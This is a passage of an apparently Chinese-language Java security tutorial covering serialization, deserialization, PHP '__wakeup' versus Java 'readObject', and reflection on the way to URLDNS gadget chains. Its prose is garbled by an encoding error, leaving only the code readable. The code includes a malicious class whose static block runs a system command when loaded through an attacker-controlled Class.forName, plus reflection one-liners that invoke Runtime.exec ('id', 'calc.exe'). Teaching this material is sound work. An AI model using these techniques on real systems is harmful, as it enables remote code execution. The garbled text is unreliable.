è¾“èµ·æ¥éå¸¸ä¸æ–¹ä¾¿ã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®©æŸäº›å¯¹è±¡æŒä¹…çš„ä¿å­˜ä¸‹æ¥å¹¶åˆ©äºä¼ è¾“ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™äº›å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–æˆä¸€ä¸²æ•°æ®ï¼Œä¿å­˜åœ¨æŸä¸ªåœ°æ–¹ï¼Œåœ¨éœ€è¦ç”¨åˆ°è¿™ä¸ªå¯¹è±¡æ—¶å†ååºåˆ—åŒ–è®©è¿™ä¸€ä¸²æ•°æ®è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡ã€‚çœ‹åˆ°ä¸€ä¸ªå¾ˆç”ŸåŠ¨çš„æ¯”å–»ï¼Œæƒ³æŠŠä¸€å¼ æ¡Œå­æ¬è¿›é—¨é‡Œï¼Œå¦‚æœä¸èƒ½é€šè¿‡ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†è¿™ä¸ªæ¡Œå­æ‹†å¼€ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œåœ¨æ¬è¿›å»ä¹‹åå†å°†æ¡Œå­ç»„è£…å›å»ï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œè¿™å°±æ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\n\nä¸phpååºåˆ—åŒ–ä¸åŒçš„æ˜¯phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–æä¾›äº†å…³é”®å­—`serializeå’Œunserialize`ï¼Œä½†javaå¹¶æ²¡æœ‰è¿™ç§apiï¼Œæˆ‘ä»¬åˆšæ‰æåˆ°äº†Javaçš„IOï¼Œé‚£ä¹ˆå®ƒå’ŒJavaçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¹‹é—´æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œæˆ‘ä»¬åˆšæ‰è¯´åºåˆ—åŒ–å°±æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸²å­—èŠ‚æ•°æ®å¹¶ä¿å­˜èµ·æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿‡ç¨‹çš„å®ç°å…¶å®å°±æ˜¯ä¾é javaçš„è¾“å‡ºï¼Œå°†è¿™ä¸ªå¯¹è±¡ä»javaç¨‹åºé‡Œä»¥å­—èŠ‚æ•°æ®æµçš„å½¢å¼è¾“å‡ºåˆ°javaçš„å¤–éƒ¨ï¼Œç›¸å¯¹çš„ååºåˆ—åŒ–å…¶å®å°±æ˜¯ä¾é javaçš„è¾“å…¥ï¼Œå°†javaå¤–çš„å­—èŠ‚æ•°æ®æµè¾“å…¥åˆ°javaç¨‹åºä¸­ï¼Œæœ€ç»ˆç»è¿‡ä¸€äº›å¤„ç†è¿˜åŸä¸ºå¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ˜¯éœ€è¦å¼€å‘äººå‘˜è‡ªå·±å†™å‡ºæ•´ä¸ªè¿‡ç¨‹ã€‚è¿™é‡Œæä¾›ä¸¤æ®µä½¿ç”¨javaIOè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ä»£ç ï¼ˆå¦‚æœè¦å®Œæˆæ•´ä¸ªåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œè¿˜éœ€è¦å…¶ä»–æ–¹æ³•å‚ä¸æ„å»ºï¼Œå¦‚readObjectå’ŒwriteObjectï¼Œä¸‹é¢ä¼šæåˆ°ï¼‰ï¼Œå‡è®¾ser.binæ˜¯æˆ‘ä»¬ç”¨æ¥å‚¨å­˜åºåˆ—åŒ–åå­—èŠ‚æ•°æ®æµçš„æ–‡ä»¶ï¼š\n\n```\n/** è¦åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„ç±» **/\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n\n    private String name;\n    private int age;\n\n    public Person(){\n\n    }\n    // æ„é€ å‡½æ•°\n    public Person(String name, int age){\n        this.name = name;\n        this.age = age;\n    }\n\n    @Override\n    public String toString(){\n        return \"Person{\" +\n                \"name='\" + name + '\\\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n\n```\n\n```\n/** åºåˆ—åŒ– **/\nimport java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.io.ObjectOutput;\nimport java.io.ObjectOutputStream;\n\npublic class SerializationTest {\n    public static void serialize(Object obj) throws IOException{\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n\n    public static void main(String[] args) throws Exception{\n        Person person = new Person(\"aa\",22);\n        System.out.println(person);\n        serialize(person);\n    }\n}\n\n```\n\n```\n/** ååºåˆ—åŒ– **/\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.ObjectInputStream;\n\npublic class UnserializeTest {\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));\n        Object obj = ois.readObject();\n        return obj;\n    }\n\n    public static void main(String[] args) throws Exception{\n        Person person = (Person)unserialize(\"ser.bin\");\n        System.out.println(person);\n    }\n}\n\n```\n\nè¾“å‡ºåå¯ä»¥å‘ç°åœ¨åºåˆ—åŒ–ä¹‹å‰è¾“å‡ºå¯¹è±¡personå’Œåœ¨ååºåˆ—åŒ–åè¾“å‡ºéƒ½è°ƒç”¨äº†`__toString`ï¼ŒæˆåŠŸæ„é€ äº†åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\n\n## **phpå’ŒJavaååºåˆ—åŒ–ä¹‹é—´çš„åŒºåˆ«**\n\nåœ¨phpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸­æä¾›äº†serializeå’Œunserializeå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥å°†å¯¹è±¡åºåˆ—åŒ–ä¸ºä¸€ä¸²æ•°æ®æˆ–ç›´æ¥å°†ä¸€ä¸²æ•°æ®ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œç¨‹åºå‘˜åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æ˜¯æ— æ³•å‚ä¸çš„ï¼Œä½†åœ¨Javaä¸­ï¼Œéœ€è¦ç¨‹åºå‘˜è‡ªå·±æ¥æ„å»ºåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œphpåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘`__wakeup`å‡½æ•°ï¼Œjavaåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘`readObject`æ–¹æ³•ï¼Œè™½ç„¶éƒ½æ˜¯åœ¨ååºåˆ—åŒ–æ—¶è§¦å‘ï¼Œä½†äºŒè€…ä¹‹é—´æœ‰ä¸€äº›ç»†å¾®çš„å·®åˆ«ã€‚\n\nphpååºåˆ—åŒ–ï¼ˆå¯¹ä¸€ä¸ªæ•°æ®åº“é“¾æ¥å¯¹è±¡ååºåˆ—åŒ–ï¼‰ï¼š\n\n```\n<?php\nclass Connection\n{\n    protected $link;\n    private $dsn, $username, $password;\n\n    public function __construct($dsn, $username, $password)\n    {\n        $this->dsn = dsn;\n        $this->username = username;\n        $this->password = password;\n        $this->connect();\n    }\n\n    private function connect()\n    {\n        $this->link = new PDO($this->dsn, $this->username, $this->password);\n    }\n}\n\n```\n\nå¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å‡ºåºåˆ—åŒ–åçš„è¿™ä¸ªConnectionç±»çš„å¯¹è±¡ï¼Œå‘ç°è¾“å‡ºä¸ºnullï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ä¹Ÿæ˜¯nullï¼Œå› ä¸ºåœ¨phpä¸­èµ„æºç±»å‹çš„å¯¹è±¡é»˜è®¤ä¸ä¼šå†™å…¥åºåˆ—åŒ–æ•°æ®ä¸­ã€‚\n\nå¦‚æœæˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·å°±å¯ä»¥åœ¨åºåˆ—åŒ–ååœ¨`$link`ä¸­æ‹¿åˆ°ä¸€ä¸ªæ•°æ®åº“è¿æ¥äº†ï¼š\n\n```\n<?php\nclass Connection\n{\n    protected $link;\n    private $dsn, $username, $password;\n\n    public function __construct($dsn, $username, $password)\n    {\n        $this->dsn = dsn;\n        $this->username = username;\n        $this->password = password;\n        $this->connect();\n    }\n\n    private function connect()\n    {\n        $this->link = new PDO($this->dsn, $this->username, $this->password);\n    }\n    public function __sleep()\n    {\n            return array('dsn', 'username', 'password');\n    }\n    public function __wakeup()\n    {\n        $this->connect();\n    }\n}\n\n```\n\nConnectionçš„å¯¹è±¡è¢«ååºåˆ—åŒ–åè°ƒç”¨`__wakeup`ï¼Œæ‰§è¡Œconnectå‡½æ•°è¿æ¥æ•°æ®åº“ï¼Œæ‰€ä»¥`__wakeup`çš„ä½œç”¨å…¶å®æ˜¯ååºåˆ—åŒ–åæ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä½†åœ¨phpä¸­å¾ˆå°‘åˆ©ç”¨åºåˆ—åŒ–æ•°æ®ä¼ è¾“èµ„æºç±»å‹çš„å¯¹è±¡ï¼Œè€Œå…¶ä»–ç±»å‹çš„å¯¹è±¡åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å·²ç»æŠŠå€¼å†™æ­»äº†ï¼Œæ‰€ä»¥phpçš„ååºåˆ—åŒ–æ¼æ´ä¸­å¾ˆå°‘æ˜¯ç”±`__wakeup`è¿™ä¸ªæ–¹æ³•è§¦å‘çš„ï¼Œé€šå¸¸è§¦å‘åœ¨`__destruct`ä¸­ã€‚\n\nJavaååºåˆ—åŒ–ï¼š\n\n```\nimport java.io.IOException;\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n\n    private String name;\n    private int age;\n\n    Person(String name,int age)\n    {\n        this.name = name;\n        this.age = age;\n    }\n    private void writeObject(java.io.ObjectOutputStream s) throws IOException {\n        s.defaultWriteObject();\n        s.writeObject(\"This is a Object\");\n    }\n\n    private void writeObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {\n        s.defaultReadObject();\n        String message = (String) s.readObject();\n        System.out.println(message);\n    }\n}\n\n```\n\nåœ¨`writeObject`ä¸­ï¼Œå½“ä¼ å…¥çš„å¯¹è±¡å®Œæˆäº†ä»`ObjectOutputStream`ä¸­ç»§æ‰¿æ¥çš„`defaultWriteObject`åï¼Œå‘æµå†…å†™å…¥äº†ä¸€ä¸ª\"This is a Object\"ï¼Œå› æ­¤ä¼šåœ¨åºåˆ—åŒ–åè§¦å‘æ”¹æ–¹æ³•ï¼Œå°†å­—ç¬¦ä¸²å†™å…¥è¾“å‡ºæµçš„å¯¹è±¡ä¸­ï¼Œç”¨çŸ¥è¯†æ˜Ÿçƒé‡Œæåˆ°çš„å·¥å…·SerializationDumperå¯ä»¥çœ‹åˆ°è¿™ä¸ªå­—ç¬¦ä¸²è¢«å†™åˆ°äº†objectAnnotationä½ç½®ï¼Œåœ¨ååºåˆ—åŒ–è¿˜åŸå¯¹è±¡æ—¶å°±ä¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²è¾“å‡ºã€‚\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209272017826.png)\n\nååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯æ ¹æ®å¼€å‘è€…çš„æƒ³æ³•æ¥å®ç°çš„ï¼Œæ‰€ä»¥æ€»ç»“ä¸€ä¸‹`__wakeup`å’Œ`readObject`çš„ä¸åŒå°±æ˜¯ï¼š`readObject`å€¾å‘äºè§£å†³\"ååºåˆ—åŒ–æ—¶å¦‚ä½•è¿˜åŸä¸€ä¸ªå®Œæ•´å¯¹è±¡\"è¿™ä¸ªé—®é¢˜ï¼Œè€ŒPHPçš„`__wakeup`æ›´å€¾å‘äºè§£å†³ååºåˆ—åŒ–åå¦‚ä½•åˆå§‹åŒ–è¿™ä¸ªå¯¹è±¡çš„é—®é¢˜ã€‚\n\n# åå°„+URLDNS\n\n# **Javaåå°„ç¯‡**\n\nå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªç±»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–è¯¥ç±»çš„å¯¹è±¡å¹¶è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œæˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨è¯¥ç±»ä¸­çš„é™æ€æ–¹æ³•ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨ä¸€èˆ¬æƒ…å†µä¸‹è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ—¶çš„è¿‡ç¨‹ï¼Œä½†æ˜¯åœ¨ä¸åŒçš„è¯­è¨€ä¸­ä¹Ÿæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥æ‹¿åˆ°æŸä¸€ä¸ªç±»ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œåœ¨javaä¸­æˆ‘ä»¬å¯ä»¥é€šè¿‡â€œåå°„â€æ¥æ‹¿åˆ°æŸä¸€ä¸ªç±»ä¸­çš„å…·ä½“å†…å®¹ å¦‚æœæŠŠé€šè¿‡newå¯¹è±¡å¹¶ä¸”è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•çš„è¿‡ç¨‹å«åšâ€œæ­£å°„â€ï¼Œé‚£ä¹ˆä¸ä½¿ç”¨newæ¥åˆ›å»ºå¯¹è±¡å¹¶è°ƒç”¨å…¶ä¸­æ–¹æ³•çš„è¿‡ç¨‹å°±å«åšâ€œåå°„â€\n\n## **åå°„å¸¸ç”¨åˆ°çš„æ–¹æ³•**\n\nåœ¨javaçš„langåŒ…ä¸­æœ‰ä¸€ä¸ªé™æ€Classç±» åœ¨javaç¨‹åºè¿è¡Œå¹¶ç¼–è¯‘åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œjava.lang.Classå°±ä¼šå®ä¾‹åŒ–å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡å‚¨å­˜è¯¥ç±»çš„æ‰€æœ‰ä¿¡æ¯ å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›æ–¹æ³•æ¥è·å–åˆ°è¿™ä¸ªç±»çš„ä¿¡æ¯ å…ˆäº†è§£ä¸€äº›æ–¹æ³•\n\n- `Class.forName(classname)` è·å–classnameç±»ä¸­çš„æ‰€æœ‰å±æ€§åŒ…æ‹¬ç±»å æ¯”å¦‚`Class clazz = Class.forName(\"java.lang.Runtime\");`\n\né‚£ä¹ˆç±»clazzä¸­å°±å¾—åˆ°äº†java.lang.Runtimeä¸­çš„æ‰€æœ‰å±æ€§\n\n- `Class.newInstance()`å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶è§¦å‘è¯¥ç±»çš„æ„é€ æ–¹æ³• ä¸‹é¢ä¼šè¯¦ç»†è§£é‡Š\n- `Class.getMethod(method name,arg)` è·å–ä¸€ä¸ªå¯¹è±¡ä¸­çš„publicæ–¹æ³•ï¼Œç”±äºjavaæ”¯æŒæ–¹æ³•çš„é‡è½½ï¼Œæ‰€ä»¥éœ€è¦ç¬¬äºŒå‚æ•°ä½œä¸ºè·å–çš„æ–¹æ³•çš„å½¢å‚åˆ—è¡¨ï¼Œè¿™æ ·å°±å¯ä»¥ç¡®å®šè·å–çš„æ˜¯å“ªä¸€ä¸ªæ–¹æ³•\n- `Method.invoke`() æ‰§è¡Œæ–¹æ³•ï¼Œå¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œåˆ™invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºè¯¥æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡ï¼Œå¦‚æœæ˜¯é™æ€æ–¹æ³•åˆ™ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯nullæˆ–è€…è¯¥æ–¹æ³•æ‰€åœ¨çš„ç±» ç¬¬äºŒä¸ªå‚æ•°ä¸ºè¦æ‰§è¡Œæ–¹æ³•çš„å‚æ•°\n\n`forName`å¹¶ä¸æ˜¯å”¯ä¸€è·å–ä¸€ä¸ªç±»çš„æ–¹å¼ï¼Œå…¶ä»–æ–¹å¼è¿˜æœ‰ï¼š\n\n- obj.getClass() å¦‚æœä¸Šä¸‹æ–‡ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹objï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡obj.getClassæ¥è·å–å®ƒçš„ç±»\n- Y1.class å¦‚æœå·²ç»åŠ è½½äº†ä¸€ä¸ªç±»Y1ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒç”±java.lang.classæ‰€åˆ›é€ çš„å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥ä½¿ç”¨è¿™ç§æ–¹æ³•è·å–å³å¯ï¼Œè¿™ç§æ–¹æ³•å¹¶ä¸å±äºåå°„\n- Class.Forname å¦‚æœçŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿ç”¨forNameæ¥è·å–\n\n### **å…³äºforname**\n\né»˜è®¤æƒ…å†µä¸‹ `forName`çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»åï¼Œç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯ClassLoader\n\nClassLoaderæ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ï¼Œjavaé»˜è®¤çš„ClassLoaderå°±æ˜¯æ ¹æ®ç±»ååŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åå¿…é¡»æ˜¯å®Œæ•´è·¯å¾„ï¼Œæ¯”å¦‚ä¸Šé¢æåˆ°çš„java.lang.Runtime\n\nç¬¬äºŒä¸ªå‚æ•°`initialize`ç”¨äºfornameæ—¶çš„åˆå§‹åŒ–ï¼Œä¸€èˆ¬æˆ‘ä»¬ä¼šè®¤ä¸ºåˆå§‹åŒ–å°±æ˜¯åŠ è½½ç±»çš„æ„é€ å‡½æ•°ï¼Œå…¶å®å¹¶ä¸æ˜¯ï¼Œè¿™é‡Œæåˆ°çš„åˆå§‹åŒ–æœ‰ä»¥ä¸‹è¿‡ç¨‹ï¼š\n\nçœ‹ä¸‹é¢è¿™ä¸ªç±»ï¼š\n\n```\nclass TrainPrint{\n    {\n        System.out.printf(\"Empty block inittial &s\\\\n\", this.getClass());\n    }\n\n    static{\n        System.out.printf(\"Static initial %s\\\\n\", TrainPrint.class);\n    }\n\n    public TrainPrint(){\n        System.out.printf(\"Innitial %s\\\\n\", this.getClass());\n    }\n}\n\n```\n\nè¿™ä¸ªç±»ä¸­ä¸€å…±æœ‰ä¸‰ä¸ªä»£ç å— ï¼Œåœ¨è¿›è¡Œåˆå§‹åŒ–æ—¶æŒ‰ç…§ä»¥ä¸‹ä¼˜å…ˆçº§è°ƒç”¨ä»£ç å—\n\n1. static{}\n2. {}\n3. æ„é€ å‡½æ•°\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209141644920.png)\n\nå…¶ä¸­ï¼Œstatic{}å°±æ˜¯åœ¨â€œç±»åˆå§‹åŒ–â€æ—¶è°ƒç”¨çš„ï¼Œè€Œ{}ä¸­çš„ä»£ç ä¼šæ”¾åœ¨æ„é€ å‡½æ•°çš„`super()`åé¢ï¼Œä½†åœ¨å½“å‰æ„é€ å‡½æ•°å†…å®¹çš„å‰é¢\n\næ‰€ä»¥`forNmae`ä¸­çš„`initialize=true`å…¶å®å°±æ˜¯å‘Šè¯‰jvmæ˜¯å¦æ‰§è¡Œâ€œç±»åˆå§‹åŒ–â€\n\né‚£ä¹ˆ å¦‚æœæœ‰ä»¥ä¸‹æ–¹æ³• å…¶ä¸­çš„å‚æ•°nameå¯æ§ï¼š\n\n```\npublic void ref(String name) throws Exception {\n\t\tClass.forName(name);\n}\n\n```\n\næˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°†æ¶æ„ä»£ç æ”¾ç½®åœ¨`static{}`ä¸­ï¼Œä»è€Œæ‰§è¡Œï¼š\n\n```\nclass PayLoad{\n    static{\n        try{\n            Runtime rt = Runtime.getRuntime();\n            String[] commands = {\"touch\", \"/etc/passwd\"};\n            Process pc = rt.exec(commands);\n            pc.waitFor();\n\n        } catch (Exception e){\n\n        }\n    }\n}\n\n```\n\n## **å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œå‘½ä»¤**\n\næˆ‘ä»¬åˆšæ‰æåˆ°ï¼Œå¦‚æœæƒ³æ‹¿åˆ°ä¸€ä¸ªç±»ï¼Œéœ€è¦å…ˆimportæ‰èƒ½ä½¿ç”¨ï¼Œè€Œä½¿ç”¨fornameå°±ä¸éœ€è¦äº†ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨fornameåŠ è½½ä»»æ„ç±»ã€‚\n\nåœ¨javaä¸­æ˜¯æ”¯æŒå†…éƒ¨ç±»çš„ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨æ™®é€šç±» c1ä¸­ç¼–å†™å†…éƒ¨ç±»c2ï¼Œåœ¨ç¼–è¯‘æ—¶ä¼šç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼šc1.classå’Œc1$c2.classï¼Œè¿™ä¸¤ä¸ªç±»ä¹‹é—´å¯ä»¥çœ‹ä½œæ²¡æœ‰å…³è”ï¼Œé€šè¿‡`Class.forname(\"c1$c2\")`å³å¯åŠ è½½è¿™ä¸ªå†…éƒ¨ç±»ï¼Œå½“fastjsonåœ¨`checkAutotype`æ—¶å°±ä¼šå…ˆè®²$æ›¿æ¢æˆ`.` ä¸Šé¢è¯´åˆ°çš„`$`çš„ä½œç”¨æ—¶æŸ¥æ‰¾å†…éƒ¨ç±»ã€‚\n\nå½“æˆ‘ä»¬é€šè¿‡åå°„è·å–åˆ°ä¸€ä¸ªç±»ä¹‹åï¼Œå¯ä»¥ç»§ç»­é€šè¿‡åå°„æ¥è°ƒç”¨å…¶ä¸­çš„å±æ€§å’Œæ–¹æ³•ï¼Œä¹Ÿå¯ä»¥ç»§ç»­å®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œè°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯ç”¨`newInstance()`\n\nä¸Šé¢æåˆ°è¿‡newInstanceä¼šå®ä¾‹åŒ–ç±»ï¼Œå¹¶ä¸”è§¦å‘å®ƒçš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹newInstanceæ˜¯ä¸èƒ½æˆåŠŸæ‰§è¡Œçš„ï¼Œæ¯”å¦‚\n\n```\nClass clazz = Class.forName(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.newInstance(), \"id\");\n\n```\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181327117.png)\n\næˆ‘ä»¬åˆ†æä¸Šé¢ä¸¤è¡Œä»£ç ï¼Œé¦–å…ˆé€šè¿‡åå°„å°†`java.lang.Runtime`ä¸­çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•å­˜åˆ°äº†clazzä¸­ï¼Œç»§ç»­åˆ©ç”¨åå°„æ‹¿åˆ°clazzï¼ˆRuntimeï¼‰ä¸­çš„`exec`æ–¹æ³•ï¼Œæœ€åä½¿ç”¨invokeæ‰§è¡Œè¯¥æ–¹æ³•ï¼Œé—®é¢˜å°±å‡ºåœ¨ä¹invokeçš„å‚æ•°ä¸Šã€‚\n\næˆ‘ä»¬ä¸Šé¢æåˆ°äº†invokeæ‰§è¡Œæ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¯¥æ–¹æ³•æ‰€åœ¨çš„å¯¹è±¡æˆ–è€…ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦é€šè¿‡`clazz.newInstance`æ¥å®ä¾‹åŒ–clazzï¼Œä½œä¸ºinvokeçš„å‚æ•°ï¼Œä½†clazzçš„æ„é€ å‡½æ•°æ¥è‡ªäºRuntimeï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹Runtimeçš„æ„é€ å‡½æ•°\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png)\n\nRuntimeçš„æ„é€ æ–¹æ³•ä¸ºç§æœ‰ï¼Œæ‰€ä»¥åœ¨newInstanceæ—¶æ‰ä¼šæŠ¥é”™ã€‚\n\nè¿™é‡ŒPç¥çš„**javaå®‰å…¨æ¼«è°ˆ**é‡Œè¯´æ˜äº†ä¸ºä»€ä¹ˆè¦å°†æ„é€ æ–¹æ³•è®¾ä¸ºç§æœ‰ï¼Œè¿™å°±æ˜¯å¾ˆå¸¸è§çš„â€œå•ä¾‹æ¨¡å¼â€ã€‚\n\næ¯”å¦‚å¯¹äºwebåº”ç”¨æ¥è¯´ï¼Œæ•°æ®åº“åªéœ€è¦å»ºç«‹ä¸€æ¬¡é“¾æ¥ï¼Œè€Œä¸æ˜¯æ¯æ¬¡ç”¨åˆ°æ•°æ®åº“éƒ½è¦å»ºç«‹ä¸€æ¬¡æ–°çš„è¿æ¥ï¼Œä½œä¸ºå¼€å‘è€…å°±å¯ä»¥å°†æ•°æ®åº“è¿æ¥ä½¿ç”¨çš„æ„é€ å‡½æ•°è®¾ä¸ºç§æœ‰ï¼Œç„¶åç¼–å†™ä¸€ä¸ªé™æ€æ–¹æ³•æ¥è·å–ï¼š\n\n```\npublic class TrainDB() {\n\tprivate static TrainDB instance = new TrainDB();\n\n\tpublic static TrainDB getInstance() {\n\t\treturn instance;\n\t}\n\n\tprivate TrainDB() {\n\t// å»ºç«‹è¿æ¥çš„ä»£ç \n\t}\n}\n\n```\n\nåœ¨è¿™ä¸ªç±»åˆå§‹åŒ–æ—¶ï¼Œå°±ä¼šåœ¨ç±»å†…éƒ¨å®ä¾‹åŒ–å‡ºä¸€ä¸ªè¿æ¥æ•°æ®åº“çš„å¯¹è±¡ï¼Œæˆ‘ä»¬åœ¨éœ€è¦æ•°æ®åº“è¿æ¥æ—¶ï¼Œåªéœ€è¦è°ƒç”¨å…¶ä¸­çš„`getInstance()`æ–¹æ³•è·å–è¿™ä¸ªå¯¹è±¡å³å¯ã€‚\n\nå›åˆ°å¦‚ä½•æ‰§è¡Œå‘½ä»¤ä¸Šï¼Œå¦‚æœä¸èƒ½é€šè¿‡å®ä¾‹åŒ–è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°è¯•ç»§ç»­é€šè¿‡åå°„æ¥è°ƒç”¨æ–¹æ³•ï¼Œæˆ‘ä»¬å°†ä»£ç æ”¹æˆä¸‹é¢è¿™æ ·å°±å¯ä»¥äº†ï¼š\n\n```\nClass clazz = Class.forname(\"java.lang.Runtime\");\nclazz.getMethod(\"exec\",String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz),\"calc.exe\");\n\n```\n\næˆ‘ä»¬åœ¨åˆšå¼€å§‹æ‰§è¡Œå‘½ä»¤æ—¶å°±ç”¨åˆ°äº†Runtimeæ¥è·å–å…¶ä¸­çš„`exec`æ–¹æ³•ï¼Œä¸éš¾çœ‹å‡ºå®ƒå’Œpythonçš„osç±»ä¼¼ï¼Œç»™æˆ‘ä»¬æä¾›äº†ä¸€äº›å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ï¼Œé‚£ä¹ˆRuntimeåˆ°åº•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ\næ¯å½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªjavaç¨‹åºæ—¶ï¼ŒRuntimeç±»éƒ½ä¼šç”Ÿæˆä¸€ä¸ªå®ä¾‹ï¼Œæ¥å‚¨å­˜å½“å‰è¿è¡Œçš„javaç¨‹åºçš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡Runtimeç±»ä¸­çš„`getRuntime()`æ–¹æ³•æ¥è°ƒç”¨å½“å‰javaç¨‹åºçš„è¿è¡Œç¯å¢ƒï¼ˆä¹Ÿå°±æ˜¯ä¸Šé¢æåˆ°çš„å‚¨å­˜ç›¸å…³ä¿¡æ¯çš„å®ä¾‹ï¼‰ï¼Œè¿™æ 